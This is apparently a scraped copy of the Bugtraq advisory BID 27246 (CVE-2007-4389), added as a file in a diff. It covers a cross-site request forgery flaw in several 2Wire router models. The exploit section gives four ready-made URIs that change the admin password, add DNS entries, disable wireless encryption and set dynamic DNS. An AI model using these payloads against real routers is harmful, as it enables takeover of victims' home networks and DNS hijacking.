@@ -1,0 +1,121 @@
+#SpeeDr00t@Black Falcon<br>#bid27246<p><b><span style="font-size: 18pt;">2Wire Routers Cross-Site Request Forgery Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/27246/info">info</a><br><a href="http://www.securityfocus.com/bid/27246/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/27246/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/27246/solution">solution</a><br><a href="http://www.securityfocus.com/bid/27246/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				27246
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Design Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2007-4389<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 15 2007 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jan 31 2008 07:57PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				hkm@hakim.ws and Eduardo Espina GarcÃ­a are credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					2Wire 2071 Gateway 5.29.51 <br/>
+					
+				
+					2Wire 2071 Gateway 3.17.5 <br/>
+					
+				
+					2Wire 2071 Gateway 3.7.1 <br/>
+					
+				
+					2Wire 1800HW 5.29.51 <br/>
+					
+				
+					2Wire 1800HW 3.17.5 <br/>
+					
+				
+					2Wire 1800HW 3.7.1 <br/>
+					
+				
+					2Wire 1701HG 5.29.51 <br/>
+					
+				
+					2Wire 1701HG 3.17.5 <br/>
+					
+				
+					2Wire 1701HG 3.7.1 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	To exploit this issue, an attacker must entice an unsuspecting victim into following a malicious URI.<br/><br/>Reports indicate this issue is being actively exploited in the wild.<br/><br/>The following example URIs are available:<br/><br/>Set a password (NUEVOPASS):<br/>http://192.168.1.254/xslt?PAGE=A05_POST&amp;amp;THISPAGE=A05&amp;amp;NEXTPAGE=A05_POST&amp;amp;ENABLE_PASS=on&amp;amp;PASSWORD=NUEVOPASS&amp;amp;PASSWORD_CONF=NUEVOPASS<br/><br/>Add names to the DNS:<br/>http://192.168.1.254/xslt?PAGE=J38_SET&amp;amp;THISPAGE=J38&amp;amp;NEXTPAGE=J38_SET&amp;amp;NAME=www.example.com&amp;amp;ADDR=127.0.0.1<br/><br/>Disable Wireless Authentication<br/>http://192.168.1.254/xslt?PAGE=C05_POST&amp;amp;THISPAGE=C05&amp;amp;NEXTPAGE=C05_POST&amp;amp;NAME=encrypt_enabled&amp;amp;VALUE=0<br/><br/>Set Dynamic DNS<br/>http://192.168.1.254/xslt?PAGE=J05_POST&amp;amp;THISPAGE=J05&amp;amp;NEXTPAGE=J05_POST&amp;amp;IP_DYNAMIC=TRUE
+	
+		<ul>
+</ul>
+</div>
